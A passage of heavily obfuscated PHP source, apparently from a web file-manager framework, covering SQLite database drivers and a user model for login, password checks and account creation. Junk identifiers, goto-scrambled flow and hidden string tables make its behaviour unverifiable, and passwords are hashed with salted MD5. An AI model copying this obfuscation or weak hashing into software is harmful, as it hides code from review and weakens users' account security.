function getAll() { $Bõü«Œ‚ÜŒ = array(); if ($this->numRows > 0) { for ($f‰å⁄ÜàóØ = 0; $f‰å⁄ÜàóØ < $this->numRows; $f‰å⁄ÜàóØ++) { $Bõü«Œ‚ÜŒ[$f‰å⁄ÜàóØ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Bõü«Œ‚ÜŒ; } public function getFields($a‹˘á›ﬁº∆) { $Dêí°»™Ö¨ =& $_SERVER[™⁄»üÆ]; $D¿√©†ˆ‚† = $this->query($Dêí°»™Ö¨[25] . $a‹˘á›ﬁº∆ . $Dêí°»™Ö¨[26]); $fœóëå‚œå = array(); if ($D¿√©†ˆ‚†) { foreach ($D¿√©†ˆ‚† as $AÉçèóéß— => $f÷áçÜπèµ) { $fœóëå‚œå[$f÷áçÜπèµ[$Dêí°»™Ö¨[27]]] = array($Dêí°»™Ö¨[28] => $f÷áçÜπèµ[$Dêí°»™Ö¨[27]], $Dêí°»™Ö¨[29] => $f÷áçÜπèµ[$Dêí°»™Ö¨[30]], $Dêí°»™Ö¨[31] => (bool) ($f÷áçÜπèµ[$Dêí°»™Ö¨[32]] === $Dêí°»™Ö¨[33]), $Dêí°»™Ö¨[34] => $f÷áçÜπèµ[$Dêí°»™Ö¨[35]], $Dêí°»™Ö¨[36] => strtolower($f÷áçÜπèµ[$Dêí°»™Ö¨[37]]) == $Dêí°»™Ö¨[38], $Dêí°»™Ö¨[39] => strtolower($f÷áçÜπèµ[$Dêí°»™Ö¨[40]]) == $Dêí°»™Ö¨[41]); } } return $fœóëå‚œå; } public function getTables($E¬û≈å€®å = '') { $aëäÁ≈Éªö =& $_SERVER[™⁄»üÆ]; $f¥¢ÛîµØ = $this->query($aëäÁ≈Éªö[42] . $aëäÁ≈Éªö[43] . $aëäÁ≈Éªö[44]); $Cß¯ìãÍ¥Õ = array(); foreach ($f¥¢ÛîµØ as $dÃÍ¨Ÿàª° => $eÏë‘Ø§û≈) { $Cß¯ìãÍ¥Õ[$dÃÍ¨Ÿàª°] = current($eÏë‘Ø§û≈); } return $Cß¯ìãÍ¥Õ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $FÈã„ëÜË™ =& $_SERVER[™⁄»üÆ]; $eÍªàΩß€î = sqlite_last_error($this->_linkID); $this->error = $eÍªàΩß€î . $FÈã„ëÜË™[4] . sqlite_error_string($eÍªàΩß€î); if ($FÈã„ëÜË™[33] != $this->queryStr) { $this->error .= LNG($FÈã„ëÜË™[45]) . $this->queryStr; } think_trace($this->error, $FÈã„ëÜË™[33], $FÈã„ëÜË™[46]); return $this->error; } public function escapeString($E°ÿÒ˜ùû∆) { return sqlite_escape_string($E°ÿÒ˜ùû∆); } public function parseLimit($F‘√éèÂâ≈) { $Dπ≤—Ê“´å =& $_SERVER[™⁄»üÆ]; $C”˘ºÖ«±‡ = $Dπ≤—Ê“´å[33]; if (!empty($F‘√éèÂâ≈)) { $F‘√éèÂâ≈ = explode($Dπ≤—Ê“´å[47], $F‘√éèÂâ≈); if (count($F‘√éèÂâ≈) > 1) { $C”˘ºÖ«±‡ .= $Dπ≤—Ê“´å[48] . $F‘√éèÂâ≈[1] . $Dπ≤—Ê“´å[49] . $F‘√éèÂâ≈[0] . $Dπ≤—Ê“´å[50]; } else { $C”˘ºÖ«±‡ .= $Dπ≤—Ê“´å[48] . $F‘√éèÂâ≈[0] . $Dπ≤—Ê“´å[50]; } } return $C”˘ºÖ«±‡; } } class DbSqlite3Base extends Db { public function __construct($FèÀ¨Ôêº = '') { $CÕÏøåπÚª =& $_SERVER[™⁄»üÆ]; if (!class_exists($CÕÏøåπÚª[51])) { think_exception(think_lang($CÕÏøåπÚª[10]) . $CÕÏøåπÚª[52]); } if (!empty($FèÀ¨Ôêº)) { if (!isset($FèÀ¨Ôêº[$CÕÏøåπÚª[12]])) { $FèÀ¨Ôêº[$CÕÏøåπÚª[12]] = 438; } $this->config = $FèÀ¨Ôêº; if (empty($this->config[$CÕÏøåπÚª[13]])) { $this->config[$CÕÏøåπÚª[13]] = array(); } } } public function connect($cΩ‚Âº„’í = '', $eî¬•Èêêø = 0) { $dÜ≤£Üè™„ =& $_SERVER[™⁄»üÆ]; if (!isset($this->linkID[$eî¬•Èêêø])) { if (empty($cΩ‚Âº„’í)) { $cΩ‚Âº„’í = $this->config; } $this->linkID[$eî¬•Èêêø] = new SQLite3($cΩ‚Âº„’í[$dÜ≤£Üè™„[17]]); if (!$this->linkID[$eî¬•Èêêø]) { think_exception($this->linkID[$eî¬•Èêêø]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$eî¬•Èêêø]->busyTimeout(30000); if (1 != think_config($dÜ≤£Üè™„[18])) { unset($this->config); } } return $this->linkID[$eî¬•Èêêø]; } public function free() { $this->queryID = null; } public function query($F…˜®∫·≤„) { goto Bç«ˆ¿¢àÜ; AÎÿªôä¬ä: think_status($bçØ¥Ïó”Ü[20]); $this->queryID = $this->_linkID->query($F…˜®∫·≤„); $this->debug(); goto EÓ„ö°’õê; Bç«ˆ¿¢àÜ: $bçØ¥Ïó”Ü =& $_SERVER[™⁄»üÆ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto cÉ›ƒﬂÌ†Ö; cÉ›ƒﬂÌ†Ö: $this->queryStr = $F…˜®∫·≤„; if ($this->queryID) { $this->free(); } think_action_status($bçØ¥Ïó”Ü[19], 1); goto AÎÿªôä¬ä; EÓ„ö°’õê: if (!1 === $this->queryID) { $this->error(); return !1; } else { $fﬂ“úØñ‘Û = $this->getAll(); $this->numRows = count($fﬂ“úØñ‘Û); return $fﬂ“úØñ‘Û; } goto eΩ„Îüπ÷´; eΩ„Îüπ÷´: } public function execute($aÕâÕïøÓô) { goto DøáÏÁ®ë; bß´∞ò¶◊Œ: $this->queryStr = $aÕâÕïøÓô; if ($this->queryID) { $this->free(); } think_action_status($FºÉÌ„úî˜[21], 1); goto Bí„ˆÜàâ·; Bí„ˆÜàâ·: think_status($FºÉÌ„úî˜[20]); $dëâ™Ÿ‡ÊÓ = $this->_linkID->exec($aÕâÕïøÓô); $this->debug(); goto dæ◊‡Ÿ≠ñ¨; dæ◊‡Ÿ≠ñ¨: if (!1 === $dëâ™Ÿ‡ÊÓ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto aü¶ıçú „; DøáÏÁ®ë: $FºÉÌ„úî˜ =& $_SERVER[™⁄»üÆ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto bß´∞ò¶◊Œ; aü¶ıçú „: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[™⁄»üÆ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $d≈íÉ·ÀÑë = $this->_linkID->query($_SERVER[™⁄»üÆ][23]); if (!$d≈íÉ·ÀÑë) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $dì≤Ù≥§øá = $this->_linkID->query($_SERVER[™⁄»üÆ][24]); if (!$dì≤Ù≥§øá) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $B°¡ÇÏ◊àﬁ = array(); while ($aˆÏ¡ÏŒπ¡ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $B°¡ÇÏ◊àﬁ[] = $aˆÏ¡ÏŒπ¡; } $this->queryID->reset(); return $B°¡ÇÏ◊àﬁ; } public function getFields($CﬂäÌÍˆËé) { $AÉâø‡ÏÕ∫ =& $_SERVER[™⁄»üÆ]; $Eêªƒ»–± = $this->query($AÉâø‡ÏÕ∫[25] . $CﬂäÌÍˆËé . $AÉâø‡ÏÕ∫[26]); $EÆü”√ΩæÏ = array(); if ($Eêªƒ»–±) { foreach ($Eêªƒ»–± as $e˘⁄Â“ÊÆÓ => $f“ûﬂ≤¢√›) { $EÆü”√ΩæÏ[$f“ûﬂ≤¢√›[$AÉâø‡ÏÕ∫[28]]] = array($AÉâø‡ÏÕ∫[28] => $f“ûﬂ≤¢√›[$AÉâø‡ÏÕ∫[28]], $AÉâø‡ÏÕ∫[29] => $f“ûﬂ≤¢√›[$AÉâø‡ÏÕ∫[29]], $AÉâø‡ÏÕ∫[31] => (bool) ($f“ûﬂ≤¢√›[$AÉâø‡ÏÕ∫[31]] === $AÉâø‡ÏÕ∫[33]), $AÉâø‡ÏÕ∫[34] => $f“ûﬂ≤¢√›[$AÉâø‡ÏÕ∫[53]], $AÉâø‡ÏÕ∫[36] => (bool) $f“ûﬂ≤¢√›[$AÉâø‡ÏÕ∫[54]], $AÉâø‡ÏÕ∫[39] => (bool) $f“ûﬂ≤¢√›[$AÉâø‡ÏÕ∫[54]]); } } return $EÆü”√ΩæÏ; } public function getTables($C¢¥πÓè·® = '') { $dô—ºÏ˘ì› =& $_SERVER[™⁄»üÆ]; $D¥©ÁôÜÈﬂ = $this->query($dô—ºÏ˘ì›[42] . $dô—ºÏ˘ì›[43] . $dô—ºÏ˘ì›[44]); $bùò˜„ÒªÍ = array(); foreach ($D¥©ÁôÜÈﬂ as $DÒïÈÈßΩŒ => $Cå‚ﬁˆÉ—Ò) { $bùò˜„ÒªÍ[$DÒïÈÈßΩŒ] = current($Cå‚ﬁˆÉ—Ò); } return $bùò˜„ÒªÍ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $bŸòµ’ñæˆ =& $_SERVER[™⁄»üÆ]; $this->error = $this->_linkID->lastErrorMsg(); if ($bŸòµ’ñæˆ[33] != $this->queryStr) { $this->error .= LNG($bŸòµ’ñæˆ[45]) . $this->queryStr; } think_trace($this->error, $bŸòµ’ñæˆ[33], $bŸòµ’ñæˆ[46]); return $this->error; } public function escapeString($CçÑ≈ª÷Æ’) { $c»©∞ââõÑ =& $_SERVER[™⁄»üÆ]; if ($this->_linkID) { return $this->_linkID->escapeString($CçÑ≈ª÷Æ’); } return str_ireplace($c»©∞ââõÑ[55], $c»©∞ââõÑ[56], $CçÑ≈ª÷Æ’); } public function parseLimit($bœÀñúÖ®ç) { $e»±ñ™ ä¨ =& $_SERVER[™⁄»üÆ]; $D†óµø‚Ë… = $e»±ñ™ ä¨[33]; if (!empty($bœÀñúÖ®ç)) { $bœÀñúÖ®ç = explode($e»±ñ™ ä¨[47], $bœÀñúÖ®ç); if (count($bœÀñúÖ®ç) > 1) { $D†óµø‚Ë… .= $e»±ñ™ ä¨[48] . $bœÀñúÖ®ç[1] . $e»±ñ™ ä¨[49] . $bœÀñúÖ®ç[0] . $e»±ñ™ ä¨[50]; } else { $D†óµø‚Ë… .= $e»±ñ™ ä¨[48] . $bœÀñúÖ®ç[0] . $e»±ñ™ ä¨[50]; } } return $D†óµø‚Ë…; } } goto b˘ãÿ•ÉÆõ; bó⁄§««é¬: class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\x72"; protected $tableMeta = array("\164\141\142\154\145\x4e\x61\x6d\145" => "\x75\x73\145\x72\137\x6d\145\x74\x61", "\155\x65\x74\141\106\151\145\154\x64" => "\165\163\145\162\111\x44"); protected $simpleField = "\165\163\x65\x72\111\x44\x2c\x6e\x69\x63\x6b\x4e\141\155\145\54\156\x61\155\x65\54\x61\166\x61\x74\x61\x72\54\163\x65\x78\54\163\x74\141\164\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Eƒ⁄ØƒŒ—√) { $Cñ•Âèﬂº∑ =& $_SERVER[™⁄»üÆ]; $AÏÌàºõÌ≥ = $Cñ•Âèﬂº∑[2134]; return array($Cñ•Âèﬂº∑[1780] => array($Eƒ⁄ØƒŒ—√[0], $AÏÌàºõÌ≥), $Cñ•Âèﬂº∑[1782] => array($Eƒ⁄ØƒŒ—√[0], $AÏÌàºõÌ≥), $Cñ•Âèﬂº∑[2135] => array($Eƒ⁄ØƒŒ—√[0], $AÏÌàºõÌ≥)); } protected function getInfo($E»ıﬁñàõ, $AÁŸá˜º…• = false) { $d∆ó‚•›≈« = $this->getInfoSimple($E»ıﬁñàõ); if (!is_array($d∆ó‚•›≈«)) { return array(); } if ($AÁŸá˜º…•) { return $this->_getInfoApply($d∆ó‚•›≈«); } return $this->cacheFunctionGet($_SERVER[™⁄»üÆ][1784], $E»ıﬁñàõ); } protected function getInfoFull($aúπÃëöÊ™, $DÕçÎ‘à©• = false) { $cÆ√Í°ÌâÍ = $this->getInfoSimple($aúπÃëöÊ™); if (!is_array($cÆ√Í°ÌâÍ)) { return array(); } if ($DÕçÎ‘à©•) { return $this->_getInfoApply($cÆ√Í°ÌâÍ, !0); } return $this->cacheFunctionGet($_SERVER[™⁄»üÆ][2136], $aúπÃëöÊ™); } private function _getInfoApply($EÌ≤…˘Çáû, $d¨≤ª∞≈Ö≈ = false) { goto D›ŸåãÉÕÂ; D›ŸåãÉÕÂ: $AÚäªåû£Ó =& $_SERVER[™⁄»üÆ]; if (!$EÌ≤…˘Çáû) { return $EÌ≤…˘Çáû; } $F‚á∑¨î∫∆ = md5($AÚäªåû£Ó[2137] . $EÌ≤…˘Çáû[$AÚäªåû£Ó[859]] . $AÚäªåû£Ó[2138] . $EÌ≤…˘Çáû[$AÚäªåû£Ó[28]]); goto cı©±ÜÿΩ; cı©±ÜÿΩ: $EÌ≤…˘Çáû = $this->_listDataApplyItem($EÌ≤…˘Çáû); $e®†§πÍÎΩ = Model($AÚäªåû£Ó[1214])->metaGet($EÌ≤…˘Çáû[$AÚäªåû£Ó[85]][$AÚäªåû£Ó[396]]); $EÌ≤…˘Çáû[$AÚäªåû£Ó[2139]] = $F‚á∑¨î∫∆; goto Bßû»‡∏ô‰; Bßû»‡∏ô‰: $EÌ≤…˘Çáû[$AÚäªåû£Ó[85]][$AÚäªåû£Ó[1970]] = isset($e®†§πÍÎΩ[$AÚäªåû£Ó[1971]]) ? $e®†§πÍÎΩ[$AÚäªåû£Ó[1971]] : null; if ($d¨≤ª∞≈Ö≈) { $EÌ≤…˘Çáû[$AÚäªåû£Ó[446]] = $this->metaGet($EÌ≤…˘Çáû[$AÚäªåû£Ó[1537]]); } return $EÌ≤…˘Çáû; goto Dò§°¡„ÚŸ; Dò§°¡„ÚŸ: } protected function getInfoSimple($AÓãõÜî‰æ, $cËœÆêêø∏ = false) { $b’¨ÃîéÎÖ =& $_SERVER[™⁄»üÆ]; if (!$AÓãõÜî‰æ) { return array(); } if ($cËœÆêêø∏) { $Dæ∆åä¡›’ = $this->where(array($b’¨ÃîéÎÖ[1537] => intval($AÓãõÜî‰æ)))->find(); if (!is_array($Dæ∆åä¡›’)) { return array(); } $Dæ∆åä¡›’[$b’¨ÃîéÎÖ[2140]] = Action($b’¨ÃîéÎÖ[2141])->parseUrl($Dæ∆åä¡›’[$b’¨ÃîéÎÖ[2140]]); return $Dæ∆åä¡›’; } return $this->cacheFunctionGet($b’¨ÃîéÎÖ[1785], $AÓãõÜî‰æ); } protected function getInfoSimpleOuter($d‹òÜﬂœ∞¡) { goto BˆˆÒﬂ≥Œó; béº®ú·ÈÈ: return $EÆèÍ·í∂; goto eå∂πïÂú; BˆˆÒﬂ≥Œó: $CÂ˜∆íôµ˜ =& $_SERVER[™⁄»üÆ]; if (!$d‹òÜﬂœ∞¡ || $d‹òÜﬂœ∞¡ == 0) { return array($CÂ˜∆íôµ˜[1537] => $CÂ˜∆íôµ˜[191], $CÂ˜∆íôµ˜[28] => $CÂ˜∆íôµ˜[160] . LNG($CÂ˜∆íôµ˜[2142]) . $CÂ˜∆íôµ˜[518], $CÂ˜∆íôµ˜[2140] => STATIC_PATH . $CÂ˜∆íôµ˜[2143]); } $D©ÉÙÀˆÇË = $this->cacheFunctionGet($CÂ˜∆íôµ˜[1785], $d‹òÜﬂœ∞¡); goto D¨Ëè»ŒÆá; D¨Ëè»ŒÆá: $EÆèÍ·í∂ = array_field_key($D©ÉÙÀˆÇË, explode($CÂ˜∆íôµ˜[47], $this->simpleField)); if (!$EÆèÍ·í∂) { return array($CÂ˜∆íôµ˜[1537] => $CÂ˜∆íôµ˜[1093], $CÂ˜∆íôµ˜[28] => $CÂ˜∆íôµ˜[160] . LNG($CÂ˜∆íôµ˜[2144]) . $CÂ˜∆íôµ˜[518], $CÂ˜∆íôµ˜[2140] => STATIC_PATH . $CÂ˜∆íôµ˜[2145]); } $EÆèÍ·í∂[$CÂ˜∆íôµ˜[2140]] = Action($CÂ˜∆íôµ˜[2141])->parseUrl($EÆèÍ·í∂[$CÂ˜∆íôµ˜[2140]]); goto béº®ú·ÈÈ; eå∂πïÂú: } protected function groupUser($B÷∞ìÁ‘èÕ) { } public static function errorLang($Bê¨≈á÷ﬁ’) { $dﬂ˜†ƒ˘¢à =& $_SERVER[™⁄»üÆ]; $B»Ìëıëµø = array(self::ERROR_USER_NOT_EXISTS => $dﬂ˜†ƒ˘¢à[2146], self::ERROR_USER_PASSWORD_ERROR => $dﬂ˜†ƒ˘¢à[2147], self::ERROR_USER_EXIST_NAME => $dﬂ˜†ƒ˘¢à[2148], self::ERROR_USER_EXIST_PHONE => $dﬂ˜†ƒ˘¢à[2149], self::ERROR_USER_EXIST_EMAIL => $dﬂ˜†ƒ˘¢à[2150], self::ERROR_USER_LOGIN_LOCK => $dﬂ˜†ƒ˘¢à[2151], self::ERROR_IP_NOT_ALLOW => $dﬂ˜†ƒ˘¢à[2152], self::ERROR_USER_EXIST_NICKNAME => $dﬂ˜†ƒ˘¢à[2153]); return LNG($B»Ìëıëµø[$Bê¨≈á÷ﬁ’]); } public function getInfoByMeta($EØ‹Çà†ß´, $D∫ö€∂§ª¨) { $A∏áÙ§Ωô√ =& $_SERVER[™⁄»üÆ]; $A…Ùà∏Ó¡† = Model($A∏áÙ§Ωô√[2154])->where(array($A∏áÙ§Ωô√[93] => $EØ‹Çà†ß´, $A∏áÙ§Ωô√[372] => $D∫ö€∂§ª¨))->find(); if ($A…Ùà∏Ó¡†) { return $this->getInfo($A…Ùà∏Ó¡†[$A∏áÙ§Ωô√[1537]]); } return !1; } public function userLoginCheck($cñ¬ﬂ∂ÉÛÊ, $cﬁΩ¡àÑ‰´) { $EïÃ—ÛÆ‘≈ =& $_SERVER[™⁄»üÆ]; $a•í∞∆â»‹ = $this->userLoginFind($cñ¬ﬂ∂ÉÛÊ); if (!$a•í∞∆â»‹) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($a•í∞∆â»‹[$EïÃ—ÛÆ‘≈[1537]], $cﬁΩ¡àÑ‰´)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($a•í∞∆â»‹[$EïÃ—ÛÆ‘≈[1537]]); } public function userLoginFind($BÑ”ùÊ§Ãø) { $E¨≈ÿÕ—ÿÖ =& $_SERVER[™⁄»üÆ]; $CåùßîÇ¯¶ = array($E¨≈ÿÕ—ÿÖ[28] => $BÑ”ùÊ§Ãø, $E¨≈ÿÕ—ÿÖ[1974] => $BÑ”ùÊ§Ãø, $E¨≈ÿÕ—ÿÖ[303] => $BÑ”ùÊ§Ãø, $E¨≈ÿÕ—ÿÖ[2155] => $BÑ”ùÊ§Ãø, $E¨≈ÿÕ—ÿÖ[967] => $E¨≈ÿÕ—ÿÖ[969]); if ($this->nickNameRpt()) { unset($CåùßîÇ¯¶[$E¨≈ÿÕ—ÿÖ[1974]]); } return $this->where($CåùßîÇ¯¶)->find(); } public function clearCache($Cö£å“Ñ§±) { $AØÎπ±≤Ó£ =& $_SERVER[™⁄»üÆ]; $this->cacheFunctionClear($AØÎπ±≤Ó£[1784], $Cö£å“Ñ§±); $this->cacheFunctionClear($AØÎπ±≤Ó£[1785], $Cö£å“Ñ§±); $this->cacheFunctionClear($AØÎπ±≤Ó£[2136], $Cö£å“Ñ§±); } public function userPasswordCheck($AÑá•»„ãæ, $fÂÏÓ—û¡á) { $DòŸ≥É‚Ìõ =& $_SERVER[™⁄»üÆ]; $aÖ£Â¢˜Â˜ = $this->where(array($DòŸ≥É‚Ìõ[1537] => intval($AÑá•»„ãæ)))->find(); $A¯ê È˘¿á = $this->metaGet($AÑá•»„ãæ); $eñÉÈ—«™– = isset($A¯ê È˘¿á[$DòŸ≥É‚Ìõ[2156]]) ? $A¯ê È˘¿á[$DòŸ≥É‚Ìõ[2156]] : $DòŸ≥É‚Ìõ[33]; if (md5($eñÉÈ—«™– . trim($fÂÏÓ—û¡á)) !== $aÖ£Â¢˜Â˜[$DòŸ≥É‚Ìõ[859]]) { return !1; } return !0; } public function userAdd($fíëôº·ÔŒ) { goto Aí‡ôúÒ‹â; Aí‡ôúÒ‹â: $eÏû∞‚∑èë =& $_SERVER[™⁄»üÆ]; $dóëÍÁºÂ = array($eÏû∞‚∑èë[414] => $fíëôº·ÔŒ[$eÏû∞‚∑èë[28]], $eÏû∞‚∑èë[2157] => $fíëôº·ÔŒ[$eÏû∞‚∑èë[1420]], $eÏû∞‚∑èë[2158] => isset($fíëôº·ÔŒ[$eÏû∞‚∑èë[303]]) ? $fíëôº·ÔŒ[$eÏû∞‚∑èë[303]] : $eÏû∞‚∑èë[33], $eÏû∞‚∑èë[2159] => isset($fíëôº·ÔŒ[$eÏû∞‚∑èë[2155]]) ? $fíëôº·ÔŒ[$eÏû∞‚∑èë[2155]] : $eÏû∞‚∑èë[33], $eÏû∞‚∑èë[2160] => isset($fíëôº·ÔŒ[$eÏû∞‚∑èë[1974]]) ? $fíëôº·ÔŒ[$eÏû∞‚∑èë[1974]] : $fíëôº·ÔŒ[$eÏû∞‚∑èë[28]], $eÏû∞‚∑èë[2161] => isset($fíëôº·ÔŒ[$eÏû∞‚∑èë[2140]]) ? $fíëôº·ÔŒ[$eÏû∞‚∑èë[2140]] : $eÏû∞‚∑èë[33], $eÏû∞‚∑èë[2162] => isset($fíëôº·ÔŒ[$eÏû∞‚∑èë[2163]]) ? $fíëôº·ÔŒ[$eÏû∞‚∑èë[2163]] : 1, $eÏû∞‚∑èë[2164] => $fíëôº·ÔŒ[$eÏû∞‚∑èë[859]], $eÏû∞‚∑èë[1786] => isset($fíëôº·ÔŒ[$eÏû∞‚∑èë[1690]]) ? $fíëôº·ÔŒ[$eÏû∞‚∑èë[1690]] : 1024 * 1024 * 20, $eÏû∞‚∑èë[1787] => 0, $eÏû∞‚∑èë[2165] => 0, $eÏû∞‚∑èë[1829] => isset($fíëôº·ÔŒ[$eÏû∞‚∑èë[729]]) ? $fíëôº·ÔŒ[$eÏû∞‚∑èë[729]] : 1); if (!empty($fíëôº·ÔŒ[$eÏû∞‚∑èë[1537]])) { $dóëÍÁºÂ[$eÏû∞‚∑èë[1537]] = $fíëôº·ÔŒ[$eÏû∞‚∑èë[1537]]; } goto fïÑ ä´“ê; aÒöèÇ∏§◊: $DÖµËê‚∞ê = array($eÏû∞‚∑èë[2164] => $dóëÍÁºÂ[$eÏû∞‚∑èë[859]], $eÏû∞‚∑èë[2160] => $dóëÍÁºÂ[$eÏû∞‚∑èë[1974]]); $this->userEdit($D˘òÿﬂ®≠§, $DÖµËê‚∞ê); Model($eÏû∞‚∑èë[1214])->userRootAdd($D˘òÿﬂ®≠§); goto bíæí¡ﬂƒñ; bíæí¡ﬂƒñ: return $D˘òÿﬂ®≠§; goto eﬁ∞õúû√Ö; fïÑ ä´“ê: $e∆Ñ´¡öèÇ = $this->_checkExist($fíëôº·ÔŒ); if ($e∆Ñ´¡öèÇ !== !0) { return $e∆Ñ´¡öèÇ; } $D˘òÿﬂ®≠§ = $this->add($dóëÍÁºÂ); goto aÒöèÇ∏§◊; eﬁ∞õúû√Ö: } protected function userEditTest($C€˜˜°Â ö, $E◊éÊÌéÔÊ) { return $this->call($_SERVER[™⁄»üÆ][2166], $C€˜˜°Â ö, $E◊éÊÌéÔÊ); } protected function userEdit($fà•éÇÿ”¬, $f·Œ€‘´Ç‰) { goto eûΩû®ÚÉê; C»óáÒ˘çÎ: $DÒ¶§Üç› = $this->_checkExist($f·Œ€‘´Ç‰, $fà•éÇÿ”¬); if ($DÒ¶§Üç› !== !0) { return $DÒ¶§Üç›; } if (isset($f·Œ€‘´Ç‰[$D¯ü∫ÙÓƒå[859]]) && trim($f·Œ€‘´Ç‰[$D¯ü∫ÙÓƒå[859]]) != $D¯ü∫ÙÓƒå[33]) { $aÜ¡Èóı‘é = $this->metaGet($fà•éÇÿ”¬); if (empty($aÜ¡Èóı‘é[$D¯ü∫ÙÓƒå[2156]])) { $aÜ¡Èóı‘é[$D¯ü∫ÙÓƒå[2156]] = rand_string(10); Model($D¯ü∫ÙÓƒå[495])->metaSet($fà•éÇÿ”¬, $D¯ü∫ÙÓƒå[2156], $aÜ¡Èóı‘é[$D¯ü∫ÙÓƒå[2156]]); } $f·Œ€‘´Ç‰[$D¯ü∫ÙÓƒå[859]] = md5($aÜ¡Èóı‘é[$D¯ü∫ÙÓƒå[2156]] . trim($f·Œ€‘´Ç‰[$D¯ü∫ÙÓƒå[859]])); } else { unset($f·Œ€‘´Ç‰[$D¯ü∫ÙÓƒå[859]]); } goto D¡Êº¯™•¢; eûΩû®ÚÉê: $D¯ü∫ÙÓƒå =& $_SERVER[™⁄»üÆ]; $Dﬂñ˜ó’üÎ = $this->getInfoSimple($fà•éÇÿ”¬); if (!$Dﬂñ˜ó’üÎ) { return !1; } goto C»óáÒ˘çÎ; D¡Êº¯™•¢: $this->where(array($D¯ü∫ÙÓƒå[1528] => $fà•éÇÿ”¬))->save($f·Œ€‘´Ç‰); if (isset($f·Œ€‘´Ç‰[$D¯ü∫ÙÓƒå[1974]])) { $this->setNamePinyin($fà•éÇÿ”¬, $f·Œ€‘´Ç‰[$D¯ü∫ÙÓƒå[1974]]); } $this->clearCache($fà•éÇÿ”¬); goto fº•Ëó…Êë; fº•Ëó…Êë: return !0; goto c‚˘˘öÀÿø; c‚˘˘öÀÿø: } public function setNamePinyin($c≈⁄ôçÌ‘´, $D¨éÜÉÇ‹Ì = false) { $E·±’û˜ì« =& $_SERVER[™⁄»üÆ]; if (!$D¨éÜÉÇ‹Ì) { $C‰é•‡öê– = $this->getInfoSimple($c≈⁄ôçÌ‘´); $D¨éÜÉÇ‹Ì = $C‰é•‡öê–[$E·±’û˜ì«[1974]] ? $C‰é•‡öê–[$E·±’û˜ì«[1974]] : $C‰é•‡öê–[$E·±’û˜ì«[28]]; } $a¢ƒ√∆£Üç = Model($E·±’û˜ì«[520]); if (!Input::check($D¨éÜÉÇ‹Ì, $E·±’û˜ì«[570])) { return $a¢ƒ√∆£Üç->metaSet($c≈⁄ôçÌ‘´, array($E·±’û˜ì«[445] => $E·±’û˜ì«[33], $E·±’û˜ì«[444] => $E·±’û˜ì«[33])); } return $a¢ƒ√∆£Üç->metaSet($c≈⁄ôçÌ‘´, array($E·±’û˜ì«[445] => str_replace($E·±’û˜ì«[50], $E·±’û˜ì«[33], Pinyin::encode($D¨éÜÉÇ‹Ì)), $E·±’û˜ì«[444] => Pinyin::encode($D¨éÜÉÇ‹Ì, $E·±’û˜ì«[571]))); } private function nickNameRpt() { $E¡âñè∏Üæ =& $_SERVER[™⁄»üÆ]; $A¯ò—≠Ç»Ÿ = Model($E¡âñè∏Üæ[749])->get($E¡âñè∏Üæ[2167]); $fçû∞ÈÏÜ‹ = $GLOBALS[$E¡âñè∏Üæ[6]][$E¡âñè∏Üæ[378]][$E¡âñè∏Üæ[2167]]; $BÈÉÔ∆º´◊ = !is_null($A¯ò—≠Ç»Ÿ) ? $A¯ò—≠Ç»Ÿ : $fçû∞ÈÏÜ‹; return !!$BÈÉÔ∆º´◊; } private function _checkExist($a√êôÖ∫∑Ï, $cªÏ¬‰≈ñ€ = false) { $C‹€çÈçë« =& $_SERVER[™⁄»üÆ]; $A°óˆ‚õ§√ = array($C‹€çÈçë«[28] => UserModel::ERROR_USER_EXIST_NAME, $C‹€çÈçë«[1974] => UserModel::ERROR_USER_EXIST_NICKNAME, $C‹€çÈçë«[303] => UserModel::ERROR_USER_EXIST_EMAIL, $C‹€çÈçë«[2155] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($A°óˆ‚õ§√[$C‹€çÈçë«[1974]]); } $eëﬂì·ßòΩ = $cªÏ¬‰≈ñ€ ? array($C‹€çÈçë«[1537] => array($C‹€çÈçë«[2168], $cªÏ¬‰≈ñ€)) : array(); foreach ($A°óˆ‚õ§√ as $bçú›·ÌŸî => $A…øöª∂“È) { $B¿ç≤“”ä¬ = array(); foreach ($A°óˆ‚õ§√ as $DÜí „êöÒ => $B¡ççê‚á™) { if (isset($a√êôÖ∫∑Ï[$DÜí „êöÒ]) && $a√êôÖ∫∑Ï[$DÜí „êöÒ]) { $B¿ç≤“”ä¬[] = $a√êôÖ∫∑Ï[$DÜí „êöÒ]; } } if (!$B¿ç≤“”ä¬) { continue; } $e‘≤ıÇ¨„ = array_merge(array($bçú›·ÌŸî => array($C‹€çÈçë«[7], $B¿ç≤“”ä¬)), $eëﬂì·ßòΩ); $B©ë∆âºü≥ = $this->where($e‘≤ıÇ¨„)->find(); if ($B©ë∆âºü≥) { return $A…øöª∂“È; } } return !0; } public function userListInfo($dÉ∞«‚«ùÍ) { $Eî·äê∂Ø„ =& $_SERVER[™⁄»üÆ]; $bÿø≈±ùöÙ = array(); $dÉ∞«‚«ùÍ = 